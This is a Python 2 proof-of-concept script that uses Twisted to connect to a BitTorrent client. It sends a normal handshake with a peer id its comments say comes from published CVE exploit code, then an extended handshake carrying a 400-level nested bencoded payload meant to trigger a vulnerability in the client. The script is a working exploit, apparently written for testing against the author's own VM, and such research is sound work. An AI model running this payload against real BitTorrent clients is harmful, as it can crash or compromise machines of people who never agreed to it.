"""
This script triggers the vulnerability detailed in ???

"""

import struct
import sys

from twisted.internet import reactor, protocol
from twisted.internet import protocol



class Client(protocol.Protocol):
    def connectionMade(self):
        print "Connected!"

        self.send_handshake()
        self.send_extended()

        pass

    def send_handshake(self):
        """
        Send the normal BitTorrent handshake
        """
        print 'Sending handshake'
        proto = 'BitTorrent protocol'

        #print the reserved bytes
        reserved = '\x00\x00\x00\x00\x00\x10\x00\x01'

        #print the info hash for the rand1 torrent
        infohash = '\x61\x53\x77\x28\x08\x87\x36\xBB\xC2\x75\xFE\xBE\xE9\x26\xC6\x2C\x75\x22\xC7\x80'

        #print out the peer id
        #taken directly from the exploit code provide in the CVE description.
        peerid = '\xd9\x38\x1b\x72\x6d\x7c\x4f\xd6\x41\x00\xc3\x7a\x55\xc4\x77\x5e\xa9\xc8\x6b\x82'

        self.transport.write('\x13' + proto + reserved + infohash + peerid)

    def send_extended(self):
        """
        Send an extended handshake [described here]()
        with an extra long client id string.
        """
        print 'Sending extended handshake with exploit'

        type = '\x14'
        message_id = '\x00'
        #This is the max size our string can be given that we only use
        #a single byte for the length.
        #payload = '\xff'*16599


        depth = 400

        payload = 'l1:s'*depth + 'e'*depth

        #bencode dictionary
        bdict = 'd1:ei0e1:md6:ut_pexi1e' + payload +'e1:pi0e1:v8:yoloswage'

        data = type + message_id + bdict
        prefix = struct.pack('!I', len(data))
        self.transport.write(prefix + data)

    def dataReceived(self, data):
        print 'Response Received'

        print data[1:len('Bittorrent protocol')+1]

        reserved = data[20:28]
        reserved_str = ":".join("{0:x}".format(ord(c)) for c in reserved)

        pass

    def connectionLost(self, reason):
        print "connection lost"

class CFactory(protocol.ClientFactory):
    protocol = Client

    def clientConnectionFailed(self, connector, reason):
        print "Connection failed!"
        reactor.stop()

    def clientConnectionLost(self, connector, reason):
        print "Connection lost - goodbye!"
        print reason
        reactor.stop()

def main():
    #put in the address for the machine running the vulnerable version of BitTorrent
    #I use localhost since I am tunneling to a VM on a different network.
    reactor.connectTCP("localhost", 6888, CFactory())
    reactor.run()

if __name__ == '__main__':
    main()

